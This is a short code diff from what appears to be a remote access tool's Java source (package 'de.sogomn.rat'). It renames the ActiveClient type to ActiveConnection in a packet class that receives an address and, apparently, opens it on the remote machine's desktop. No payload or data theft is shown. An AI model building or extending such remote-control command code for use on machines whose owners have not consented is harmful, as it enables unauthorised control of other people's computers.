@@ -6,7 +6,7 @@ import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class WebsitePacket implements IPacket {
 	
@@ -29,17 +29,17 @@ public final class WebsitePacket implements IPacket {
 	}
 	
 	@Override
-	public void send(final ActiveClient client) {
+	public void send(final ActiveConnection client) {
 		client.writeUTF(address);
 	}
 	
 	@Override
-	public void receive(final ActiveClient client) {
+	public void receive(final ActiveConnection client) {
 		address = client.readUTF();
 	}
 	
 	@Override
-	public void execute(final ActiveClient client) {
+	public void execute(final ActiveConnection client) {
 		final boolean desktopSupported = Desktop.isDesktopSupported();
 		
 		if (desktopSupported) {
